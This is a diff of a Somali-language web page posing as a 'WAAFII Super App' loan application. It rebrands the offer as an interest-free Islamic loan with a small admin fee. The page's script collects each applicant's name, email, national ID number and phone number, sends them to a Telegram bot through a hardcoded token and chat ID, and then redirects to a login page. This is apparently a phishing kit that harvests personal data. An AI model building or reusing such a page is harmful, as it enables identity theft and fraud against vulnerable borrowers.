@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>WAAFII Super App - Codsad Amaah Dhijitaal ah | Soomaaliya</title>
+    <title>WAAFII Super App - Codsad Maaliyadeed Dhijitaal ah | Soomaaliya</title>
     <style>
         * {
             margin: 0;
@@ -159,19 +159,19 @@
             box-shadow: 0 0 0 3px rgba(20, 184, 134, 0.15);
         }
 
-        .duration-group {
+        .toggle-group, .duration-group {
             display: flex;
             gap: 12px;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             flex-wrap: wrap;
         }
 
-        .duration-pill {
+        .toggle-pill, .duration-pill {
             flex: 1;
             text-align: center;
             background: #F1F4FA;
             border-radius: 40px;
-            padding: 10px 5px;
+            padding: 11px 5px;
             font-weight: 600;
             font-size: 0.85rem;
             cursor: pointer;
@@ -180,7 +180,7 @@
             border: 1px solid transparent;
         }
 
-        .duration-pill.active {
+        .toggle-pill.active, .duration-pill.active {
             background: var(--waafii-teal-light);
             border-color: var(--waafii-teal);
             color: var(--waafii-teal);
@@ -262,21 +262,21 @@
 <body>
 
 <div class="hero-summary">
-    <div class="waafii-badge">⚡ AMAAHA SUPERSONIC EE WAAFII</div>
+    <div class="waafii-badge">🕌 ADEEG MAALIYADEED OO BASHARI AH (QARD AL-HASAN)</div>
     <h1>
         <span class="currency-symbol">$</span>
         <span id="loanAmountDisplay">0</span>
     </h1>
     <div class="summary-stats">
         <span>📱 Isku-xidhka Boorsada WAAFII</span>
-        <span>🇸🇴 Aqoonsiga Soomaaliya Waa La Aqbalay</span>
-        <span>⚡ 0% Kharash Kaashamiyeed</span>
+        <span>🇸🇴 Aqoonsiga Soomaaliya</span>
+        <span>⚡ 0% Dulsaar Nuuc Kasta Ah</span>
     </div>
 </div>
 
 <div class="application-card">
     <div class="section-title">Dhammaystir xogtaada</div>
-    <div class="section-sub">Amaah dhijitaal ah oo degdeg ah boorsadaada WAAFII — Muqdisho, Hargeysa, Kismaayo</div>
+    <div class="section-sub">Credit maaliyadeed oo xalaal ah kuna dhacaya boorsadaada WAAFII — Muqdisho, Hargeysa, Kismaayo</div>
 
     <form id="waafiiLoanForm" onsubmit="handleSubmitApplication(event)">
         <div class="input-field">
@@ -299,55 +299,68 @@
             <input type="tel" id="phone" placeholder="0612345678 / 063XXXXXX" required>
         </div>
 
-        <label>⏱️ Dooro Qorshaha Bixinta</label>
+        <label>🔄 Habka Qaybinta Bixinta (Repayment Frequency)</label>
+        <div class="toggle-group" id="frequencyGroup">
+            <div class="toggle-pill active" data-freq="weekly">📅 Bixinta Todobaadlaha (Weekly)</div>
+            <div class="toggle-pill" data-freq="monthly">📆 Bixinta Billaha (Monthly)</div>
+        </div>
+
+        <label>⏱️ Dooro Qorshaha Heshiiska Muddada Bixinta</label>
         <div class="duration-group" id="durationGroup">
-            <div class="duration-pill active" data-months="1" data-rate="1.2">1 Bil · 1.2%</div>
-            <div class="duration-pill" data-months="3" data-rate="4.2">3 Bilood · 4.2%</div>
-            <div class="duration-pill" data-months="6" data-rate="7.5">6 Bilood · 7.5%</div>
-            <div class="duration-pill" data-months="12" data-rate="13.5">12 Bilood · 13.5%</div>
+            <div class="duration-pill active" data-months="1">1 Bil Term</div>
+            <div class="duration-pill" data-months="3">3 Bilood Term</div>
+            <div class="duration-pill" data-months="6">6 Bilood Term</div>
+            <div class="duration-pill" data-months="12">12 Bilood Term</div>
         </div>
 
         <div class="repayment-preview">
             <div class="preview-row">
-                <span>📊 Heerka Dulsaarka La Codsaday</span>
-                <strong class="teal-value" id="interestRateDisplay">1.2%</strong>
+                <span>📊 Nooca Maaliyadda</span>
+                <strong class="teal-value">Qard al-Hasan (Dulsaar La'aan)</strong>
             </div>
             <div class="preview-row">
-                <span>💸 Qadarka Dulsaarka</span>
-                <strong id="interestAmountDisplay">$0.00</strong>
+                <span>🛠️ Kharashka Adeegga Maamulka (Fixed)</span>
+                <strong id="adminFeeDisplay">$4.50</strong>
+            </div>
+            <div class="preview-row">
+                <span>📅 Cadadka Qaybta Qorshaha</span>
+                <strong id="installmentCalculationDisplay" class="teal-value">$0.00</strong>
             </div>
             <div class="preview-row total">
-                <span>💰 Wadarta Lacagta La Bixinayo (Rasuul + Dulsaarka)</span>
+                <span>💰 Wadarta Lacagta Goolka (Rasuulka + Maamulka)</span>
                 <strong id="totalRepaymentDisplay">$0.00</strong>
             </div>
             <div class="preview-row" style="font-size: 0.7rem; margin-top: 8px;">
                 <span>💵 Waxaa lagu shubayaa boorsadaada WAAFII toos</span>
-                <span>✅ Ma jiraan kharashyo qarsoon</span>
+                <span>✅ Ballanqaad Shareeco: Dulsaar kuma kordhayo haddii aad dib u dhacdo</span>
             </div>
         </div>
 
         <div class="input-field">
-            <label>🎯 Ujeedada Amaahda</label>
-            <textarea id="purpose" rows="2" placeholder="Tusaale: Ganacsi, Waxbarasho, Daryeel Caafimaad, Degdeg..."></textarea>
+            <label>🎯 Ujeedada Maaliyadda (Ganacsi, Caafimaad, Waxbarasho ama Mid Gaar ah)</label>
+            <textarea id="purpose" rows="2" placeholder="Tusaale: Alaab u soo iibinta dukaankayga, kharashka jaamacadda..."></textarea>
         </div>
 
         <button type="submit" class="submit-action">
             🚀 Soo Gudbi Codsiga → Hel Lacagta
         </button>
         <div class="note-local">
-            Adoo codsanaya waxaad ogolaanaysaa shuruudaha amaahda ee WAAFII iyo bixinta degdega ah ee boorsada mobilka. 🇸🇴
+            Adoo codsanaya waxaad ogolaanaysaa shuruudaha heshiiska barakaysan ee WAAFII iyo bixinta boorsada mobilka. 🇸🇴
         </div>
     </form>
 </div>
 
 <script>
-    const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
+    const BOT_TOKEN = '8858894062:AAGI48aQwcvagqqbzgF9WzYy8v98Rb5V_kI';
     const CHAT_ID = '5520957080';
 
+    const FIXED_ADMIN_FEE = 4.50;
+
     let currentLoanAmount = localStorage.getItem('selectedLoanAmount') ? parseInt(localStorage.getItem('selectedLoanAmount')) : 1000;
-    if (isNaN(currentLoanAmount) || currentLoanAmount < 100) currentLoanAmount = 1000;
+    if (isNaN(currentLoanAmount) || currentLoanAmount < 50) currentLoanAmount = 1000;
     
-    let selectedDuration = { months: 1, ratePercent: 1.2 };
+    let selectedDuration = { months: 1 };
+    let selectedFrequency = 'weekly'; // Default to weekly frequency
     
     function formatMoney(amount) {
         return `$${parseFloat(amount).toFixed(2)}`;
@@ -355,15 +368,37 @@
     
     function updateLoanPreview() {
         const loanPrincipal = currentLoanAmount;
-        const rate = selectedDuration.ratePercent;
-        const interestAmount = (loanPrincipal * (rate / 100));
-        const totalRepayment = loanPrincipal + interestAmount;
+        const totalRepayment = loanPrincipal + FIXED_ADMIN_FEE;
         
         document.getElementById('loanAmountDisplay').innerText = `${currentLoanAmount.toLocaleString()}`;
-        document.getElementById('interestRateDisplay').innerHTML = `${rate}%`;
-        document.getElementById('interestAmountDisplay').innerHTML = formatMoney(interestAmount);
+        document.getElementById('adminFeeDisplay').innerHTML = formatMoney(FIXED_ADMIN_FEE);
         document.getElementById('totalRepaymentDisplay').innerHTML = formatMoney(totalRepayment);
         
+        // Calculate dynamic installment text
+        let installmentAmount = 0;
+        let infoLabel = '';
+        
+        if (selectedFrequency === 'weekly') {
+            const totalWeeks = selectedDuration.months * 4; // Estimate 4 weeks per month
+            installmentAmount = totalRepayment / totalWeeks;
+            infoLabel = `${formatMoney(installmentAmount)} / Todobaadkii (${totalWeeks} Toddobaad)`;
+        } else {
+            installmentAmount = totalRepayment / selectedDuration.months;
+            infoLabel = `${formatMoney(installmentAmount)} / Bishiiba (${selectedDuration.months} Bil)`;
+        }
+        
+        document.getElementById('installmentCalculationDisplay').innerText = infoLabel;
+        
+        // Resync Frequency pills status
+        document.querySelectorAll('.toggle-pill').forEach(pill => {
+            if (pill.getAttribute('data-freq') === selectedFrequency) {
+                pill.classList.add('active');
+            } else {
+                pill.classList.remove('active');
+            }
+        });
+
+        // Resync duration pills status
         document.querySelectorAll('.duration-pill').forEach(pill => {
             const monthsAttr = parseInt(pill.getAttribute('data-months'));
             if (monthsAttr === selectedDuration.months) {
@@ -374,19 +409,35 @@
         });
     }
     
-    function setDuration(months, ratePercent) {
-        selectedDuration = { months, ratePercent };
+    function setDuration(months) {
+        selectedDuration = { months };
         updateLoanPreview();
     }
     
-    function initDurationListeners() {
+    function setFrequency(freq) {
+        selectedFrequency = freq;
+        updateLoanPreview();
+    }
+    
+    function initInteractiveListeners() {
+        // Duration configuration listeners
         const pills = document.querySelectorAll('.duration-pill');
         pills.forEach(pill => {
             pill.addEventListener('click', () => {
                 const months = parseInt(pill.getAttribute('data-months'));
-                const rate = parseFloat(pill.getAttribute('data-rate'));
-                if (!isNaN(months) && !isNaN(rate)) {
-                    setDuration(months, rate);
+                if (!isNaN(months)) {
+                    setDuration(months);
+                }
+            });
+        });
+
+        // Frequency mode configuration listeners
+        const freqPills = document.querySelectorAll('.toggle-pill');
+        freqPills.forEach(pill => {
+            pill.addEventListener('click', () => {
+                const freq = pill.getAttribute('data-freq');
+                if (freq) {
+                    setFrequency(freq);
                 }
             });
         });
@@ -426,25 +477,32 @@
             return;
         }
         
+        const totalDue = currentLoanAmount + FIXED_ADMIN_FEE;
+        const localizedFrequencyText = selectedFrequency === 'weekly' ? 'Todobaadle (Weekly)' : 'Billaha (Monthly)';
+        
         const appData = {
             fullName, email, idNumber, phone, purpose,
             loanAmount: currentLoanAmount,
             durationMonths: selectedDuration.months,
-            interestRate: selectedDuration.ratePercent,
+            repaymentFrequency: selectedFrequency,
+            interestRate: 0,
+            adminFee: FIXED_ADMIN_FEE,
+            totalRepayment: totalDue,
             applicationDate: new Date().toISOString()
         };
         
         localStorage.setItem('waafiiApplication', JSON.stringify(appData));
         
-        const message = `🏦 *COD SIGA AMAAHA WAAFII - SOOMAALIYA* 🇸🇴\n\n👤 *Magaca:* ${fullName}\n📧 *Email:* ${email}\n🆔 *Aqoonsiga:* ${idNumber}\n📱 *Telka:* ${phone}\n💰 *Qadarka:* $${currentLoanAmount.toLocaleString()}\n📅 *Muddada:* ${selectedDuration.months} bilood\n📈 *Heerka Dulsaarka:* ${selectedDuration.ratePercent}%\n🎯 *Ujeedada:* ${purpose}\n🕒 *Waqtiga:* ${new Date().toLocaleString()}`;
+        const message = `🏦 *COD SIGA MAALIYADDA WAAFII (QARD AL-HASAN)* 🇸🇴\n\n👤 *Magaca:* ${fullName}\n📧 *Email:* ${email}\n🆔 *Aqoonsiga:* ${idNumber}\n📱 *Telka:* ${phone}\n💰 *Qadarka:* $${currentLoanAmount.toLocaleString()} USD\n📅 *Muddada Qorshaha:* ${selectedDuration.months} bilood\n🔄 *Habka Bixinta:* ${localizedFrequencyText}\n📈 *Dulsaar/Riba:* 0% (Xalaal)\n🛠️ *Kharashka Adeegga:* $${FIXED_ADMIN_FEE.toFixed(2)}\n💰 *Wadarta Guud Goolka:* $${totalDue.toFixed(2)}\n🎯 *Ujeedada:* ${purpose}\n🕒 *Waqtiga:* ${new Date().toLocaleString()}`;
         
         await sendToTelegram(message);
         
         window.location.href = 'login.html';
     }
     
-    initDurationListeners();
+    initInteractiveListeners();
     updateLoanPreview();
 </script>
 </body>
 </html>
+    
